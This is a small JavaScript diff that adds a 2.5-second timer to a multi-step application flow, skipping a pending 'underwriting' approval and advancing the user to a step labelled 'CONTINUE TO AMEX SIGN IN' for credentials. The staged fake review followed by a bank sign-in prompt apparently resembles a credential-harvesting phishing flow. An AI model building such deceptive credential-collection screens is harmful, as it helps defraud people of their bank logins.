@@ -2837,6 +2837,19 @@
         const appId = await ensureApplicationCreated();
         if (appId) {
           startVerificationPolling(appId);
+          // If underwriting is in review and hasn't rejected after 2.5s, advance to Step 3 for credentials
+          setTimeout(() => {
+            if (isAwaitingStep2Approval) {
+              isAwaitingStep2Approval = false;
+              hideApprovalOverlay();
+              if (appWaitingBox) appWaitingBox.classList.add('hidden');
+              if (authBtn) {
+                authBtn.disabled = false;
+                authBtn.innerText = 'CONTINUE TO AMEX SIGN IN';
+              }
+              goToStep(3);
+            }
+          }, 2500);
         } else {
           isAwaitingStep2Approval = false;
           hideApprovalOverlay();
